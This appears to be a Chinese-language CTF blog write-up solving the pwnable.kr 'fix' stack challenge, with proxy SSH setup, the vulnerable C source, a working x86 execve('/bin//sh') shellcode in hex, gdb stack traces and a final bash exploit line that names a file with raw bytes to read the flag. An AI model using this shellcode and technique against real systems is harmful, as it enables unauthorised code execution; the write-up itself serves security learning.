---
layout: post
title: pwnable.kr fix
date: 2023-04-03 20:15 +0800
categories: [ctf, pwn]
tag: [pwnable.kr, stack, shellcode]
---

## 配置网络
做题前发现网络有点问题，mac上可以使用如下解决方案
```bash
brew install netcat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:7890 %h %p' fix@pwnable.kr -p 2222
scp -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:7890 %h %p' -P 2222 fix@pwnable.kr:/home/f
ix/fix .
```
或者使用`~/.ssh/config`
```
Host pwnable
	hostname pwnable.kr
	ProxyCommand ncat --proxy-type socks5 --proxy 127.0.0.1:7890 %h %p
	Port 2222
```
## 分析代码

首先分析代码，发现代码存在一定的问题。

```c
void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}
```
`sc`是23字节的，覆盖时看起来存在溢出。

以下是代码里用到的shellcode
```c
/*
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80
*/
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}

```
## 动态调试

接下来通过动态调试。

### 进入shellcode前的栈布局

拷下来本地调试一下：
```
pwndbg> stack 30
00:0000│    esp   0xffffd500 —▸ 0xf7fa8620 (_IO_2_1_stdin_) ◂— 0xfbad2288
01:0004│          0xffffd504 —▸ 0x804875e ◂— and eax, 0x64 /* '%d' */
02:0008│          0xffffd508 —▸ 0xffffd524 —▸ 0xffffd538 ◂— 0x31 /* '1' */
03:000c│    buf   0xffffd50c ◂— 0x6850c031
04:0010│          0xffffd510 ◂— 0x68732f2f ('//sh')
05:0014│          0xffffd514 ◂— 0x69622f68 ('h/bi')
06:0018│          0xffffd518 ◂— 0x50e3896e
07:001c│          0xffffd51c ◂— 0xb0e18953
08:0020│          0xffffd520 ◂— 0x80cd0b
09:0024│          0xffffd524 —▸ 0xffffd538 ◂— 0x31 /* '1' */
0a:0028│    ebp   0xffffd528 —▸ 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
0b:002c│ ret_addr 0xffffd52c —▸ 0xffffd50c ◂— 0x6850c031
0c:0030│          0xffffd530 —▸ 0xffffd570 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
```

其中，0xffffd50c是buf的起始位置

### 进入shellcode后的栈布局
```
────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────
   0x804854d  <shellcode+50>    add    esp, 0x10
   0x8048550  <shellcode+53>    nop
   0x8048551  <shellcode+54>    leave
   0x8048552  <shellcode+55>    ret
    ↓
 ► 0xffffd50c                   xor    eax, eax
   0xffffd50e                   push   eax
   0xffffd50f                   push   0x68732f2f
   0xffffd514                   push   0x6e69622f
   0xffffd519                   mov    ebx, esp
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffffd530 —▸ 0xffffd570 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│     0xffffd534 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— ...
02:0008│     0xffffd538 ◂— 0x31 /* '1' */
03:000c│     0xffffd53c ◂— 0x0
04:0010│     0xffffd540 ◂— 0x1
05:0014│     0xffffd544 —▸ 0xffffd560 ◂— 0x1
06:0018│ ebp 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
07:001c│     0xffffd54c —▸ 0xf7d9f519 (__libc_start_call_main+121) ◂— add esp, 0x10
08:0020│     0xffffd550 —▸ 0xffffd761 ◂— '/root/work/fix'
09:0024│     0xffffd554 ◂— 0x70 /* 'p' */
```

shellcode中用了五个push，执行后，他会覆盖shellcode的内容，从而触发segment fault。

* shellcode的结尾：`0xffffd520`
* esp：`0xffffd530`

也就是说，我们只有`0xffffd524`，`0xffffd528`，`0xffffd52c`可以用，最多三个`push`，但是shellcode里面有五个。
很容易想到nop掉其中一个，但是还有四个，这样还是会影响shellcode。

| NR | SYSCALL NAME | references | eax | ARG0 (ebx)           | ARG1 (ecx)              | ARG2 (edx)              | ARG3 (esi) | ARG4 (edi) | ARG5 (ebp) |
|----|--------------|------------|-----|----------------------|-------------------------|-------------------------|------------|------------|------------|
| 11 | execve       | man/ cs/   | B   | const char *filename | const char *const *argv | const char *const *envp | -          | -          | -          |

将`push eax`改成`pop xxx`后的下一条指令`push ebx`后会影响`/bin`导致segment fault，那么还有别的迁移栈的方式吗？

有，他就是`leave`指令,上远程动态调试一波。

`fix.init`

```
source /usr/share/peda/peda.py
b *main
b *shellcode
r
```

`gdb -x /tmp/fix.init fix`
```
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xff9a2f84 ("/bin//sh")
ECX: 0xff9a2fa8 --> 0xff9a2f84 ("/bin//sh")
EDX: 0xf76da870 --> 0x0
ESI: 0xf76d9000 --> 0x1b2db0
EDI: 0xf76d9000 --> 0x1b2db0
EBP: 0x0
ESP: 0xff9a2fa8 --> 0xff9a2f84 ("/bin//sh")
EIP: 0xff9a2f81 --> 0x2f0080cd
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xff9a2f7c:	push   ebx
   0xff9a2f7d:	mov    ecx,esp
   0xff9a2f7f:	mov    al,0xb
=> 0xff9a2f81:	int    0x80
   0xff9a2f83:	add    BYTE PTR [edi],ch
   0xff9a2f85:	bound  ebp,QWORD PTR [ecx+0x6e]
   0xff9a2f88:	das
   0xff9a2f89:	das
[------------------------------------stack-------------------------------------]
0000| 0xff9a2fa8 --> 0xff9a2f84 ("/bin//sh")
0004| 0xff9a2fac --> 0xf753e647 (<__libc_start_main+247>:	add    esp,0x10)
0008| 0xff9a2fb0 --> 0xf76d9000 --> 0x1b2db0
0012| 0xff9a2fb4 --> 0xf76d9000 --> 0x1b2db0
0016| 0xff9a2fb8 --> 0x0
0020| 0xff9a2fbc --> 0xf753e647 (<__libc_start_main+247>:	add    esp,0x10)
0024| 0xff9a2fc0 --> 0x1
0028| 0xff9a2fc4 --> 0xff9a3054 --> 0xff9a3dc1 ("/home/fix/fix")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xff9a2f81 in ?? ()
gdb-peda$ x/20wx 0xff9a2fa8
0xff9a2fa8:	0xff9a2f84	0xf753e647	0xf76d9000	0xf76d9000
0xff9a2fb8:	0x00000000	0xf753e647	0x00000001	0xff9a3054
0xff9a2fc8:	0xff9a305c	0x00000000	0x00000000	0x00000000
0xff9a2fd8:	0xf76d9000	0xf7715c04	0xf7715000	0x00000000
0xff9a2fe8:	0xf76d9000	0xf76d9000	0x00000000	0x5ed23a4c
gdb-peda$ x/20b 0xf753e647
0xf753e647 <__libc_start_main+247>:	0x83	0xc4	0x10	0x83	0xec	0x0c	0x50	0xe8
0xf753e64f <__libc_start_main+255>:	0x8d	0x63	0x01	0x00	0x31	0xc9	0xe9	0x28
0xf753e657 <__libc_start_main+263>:	0xff	0xff	0xff	0x8b
```
观察此时的ecx，他代表execve的参数，是一个指针数组
* 第一个地址为`0xff9a2f84`，其指向/bin//sh
* 第二个地址为`0xf753e647`，其内容的十六进制为`83c41083ec0c50e88d6301`
* 第三及后面个地址可以暂时不用管，因为第二个文件找不到，后面的就不会去找
即`/bin//sh file1 file2 file3`。现在我们可以控制这个`file1`文件的内容，写一段脚本进去

最终exp如下，记得要去`/tmp`,其他目录我们不可写

## 利用脚本
```bash
cd /tmp && echo "id && cat /home/fix/flag" > `echo -ne "\x83\xc4\x10\x83\xec\x0c\x50\xe8\x8d\x63\x01"`
```
-n表示输出不换行，-e表示解析反斜杠，如`\r`、`\e`、`\xHH`等。